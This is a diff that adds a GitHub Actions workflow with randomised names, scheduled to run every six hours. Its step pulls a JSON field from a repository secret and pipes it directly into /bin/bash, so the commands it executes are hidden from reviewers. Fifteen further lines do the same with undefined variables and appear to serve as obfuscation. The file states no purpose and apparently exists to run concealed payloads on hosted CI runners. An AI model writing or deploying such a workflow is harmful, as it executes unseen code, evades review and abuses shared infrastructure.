@@ -1,0 +1,32 @@
+name: daitaiyang7465
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: daitaiyang7465
+        env:
+          o05654: ${{ secrets.o05654 }}
+        run: |
+          echo $o05654 | jq -r .e3452 | /bin/bash
+          echo $db53991 | jq -r .khbsk02096 | /bin/bash
+          echo $e3797 | jq -r .njlw539 | /bin/bash
+          echo $l34758 | jq -r .vl28 | /bin/bash
+          echo $ko55313 | jq -r .nb20112 | /bin/bash
+          echo $wzv9 | jq -r .zqfm02835 | /bin/bash
+          echo $gvb6 | jq -r .tlfr301 | /bin/bash
+          echo $a12663 | jq -r .dp10 | /bin/bash
+          echo $cx994 | jq -r .ju34960 | /bin/bash
+          echo $gge39835 | jq -r .guzi007 | /bin/bash
+          echo $fo65330 | jq -r .wq71593 | /bin/bash
+          echo $mp8 | jq -r .uqh98 | /bin/bash
+          echo $nkwux81506 | jq -r .dp84005 | /bin/bash
+          echo $dprj76 | jq -r .qscwb92032 | /bin/bash
+          echo $ryqcg1850 | jq -r .sj4 | /bin/bash
+          echo $swb33 | jq -r .mmiz762 | /bin/bash
+
